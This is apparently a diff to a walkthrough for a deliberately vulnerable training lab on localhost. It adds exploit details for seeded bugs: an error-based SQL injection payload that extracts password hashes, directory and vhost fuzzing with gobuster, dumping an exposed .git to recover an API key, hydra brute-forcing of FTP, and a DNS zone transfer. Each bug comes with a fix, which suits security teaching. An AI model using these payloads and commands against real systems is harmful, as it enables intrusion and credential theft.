@@ -77,7 +77,11 @@ hand" moment.
 The storefront looks normal. Open the inventory report: that row's "on hand"
 cell shows `XPATH syntax error: '~admin:<hash>'` (error-based, because the sink
 fetches a single row, so a plain `UNION` would be hidden behind the aggregate's
-first row). Walk `LIMIT 1,1`, `LIMIT 2,1` for the rest.
+first row). The error string is capped at 32 chars, so `~admin:` plus the hash
+gives you only 25 of the 32 hex digits. Read the tail with a second product
+named `zz' AND updatexml(1,concat(0x7e,(SELECT MID(password_hash,20) FROM users ORDER BY id LIMIT 1)),1)-- -`
+and splice the two on the digits they share. Walk `LIMIT 1,1`, `LIMIT 2,1` for
+the rest, windowing each the same way.
 **Fix:** parameterise every query, including ones built from data already in the
 database. Stored data is still untrusted input. (`SECOND_ORDER_SINK=0` swaps in
 the safe `PDO::quote` variant for comparison.)
@@ -169,8 +173,10 @@ commit contains `WIDGETORIUM_API_KEY = 'wdg_live_sk_7f3c9a1e42b84d06b1e5c2aa9d77
 in cleartext. The second commit "moves it to an environment variable", but the
 key is still in history.
 **ZAP finds it:** the spider may miss it, depends on wordlist coverage.
-**Confirm / exploit with:** gobuster / ffuf to find the path
-(`gobuster dir -u http://127.0.0.1:8080/admin/ -w <wordlist>`), then git-dumper:
+**Confirm / exploit with:** gobuster / ffuf to find the path. gobuster ships no
+wordlist: use SecLists' `Discovery/Web-Content/common.txt`, or
+`curl -sL -o common.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt`.
+(`gobuster dir -u http://127.0.0.1:8080/admin/ -w common.txt`), then git-dumper:
 `git-dumper http://127.0.0.1:8080/admin/.git/ ./loot && cd loot && git log -p |
 grep -i api_key`.
 **Fix:** never deploy `.git` into a web root (build artefacts only, or deny the
@@ -268,8 +274,10 @@ never inside a directory that anything else serves.
 **Vulnerability:** `ftpuser:ftpuser`.
 **ZAP finds it:** N/A.
 **Confirm / exploit with:** `curl -u ftpuser:ftpuser ftp://127.0.0.1/`, or hydra
-to teach credential brute-forcing:
-`hydra -l ftpuser -P rockyou.txt ftp://127.0.0.1`.
+to teach credential brute-forcing. `rockyou.txt` ships with neither hydra nor
+macOS: `curl -sL -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`.
+Throttle with `-t 4` or the parallel connections trip the vsftpd segfault (bug 19
+note): `hydra -l ftpuser -P rockyou.txt -t 4 -f ftp://127.0.0.1`.
 **Fix:** no default credentials ship. Enforce a real password policy on service
 accounts, or use keys / SFTP.
 
@@ -332,7 +340,9 @@ sibling zone `widgetorium.lab` has `allow-transfer { none; }`; compare the two.
 `dig axfr @127.0.0.1 -p 5300 widgetorium.lab` returns `Transfer failed`
 (refused), which is how it should look.
 `dnsrecon -n 127.0.0.1 -p 5300 -d corp.widgetorium.lab -t axfr` does the same
-and parses it. Note which names point at `127.0.0.1` (live in the lab) and
+and parses it, if your build honours `-p` (some ignore it and only query 53;
+recent releases break on Python 3.14). `dig` is the source of truth.
+Note which names point at `127.0.0.1` (live in the lab) and
 which point into `10.10.0.0/16` (resolve, nothing answers, and `security.txt`
 puts them out of scope).
 **Fix:** restrict transfers to known secondaries (`allow-transfer { <ip>; }`)
@@ -354,7 +364,8 @@ name resolution is no help either: every guess resolves. You have to fuzz the
 **ZAP finds it:** no, not without being pointed at each hostname explicitly.
 **Confirm / exploit with:** `gobuster` / `ffuf` in vhost mode.
 `gobuster vhost -u http://127.0.0.1:8080 --append-domain \
-  --domain corp.widgetorium.lab -w <subdomains.txt>` flags `admin`, `dev`,
+  --domain corp.widgetorium.lab -w subdomains.txt` (SecLists
+`Discovery/DNS/subdomains-top1million-5000.txt`) flags `admin`, `dev`,
 `staging` on response-length difference. Confirm by hand:
 `curl -s -H 'Host: dev.corp.widgetorium.lab' http://127.0.0.1:8080/`.
 The AXFR from bug 20 and the SAN list from bug 22 both give you the candidate
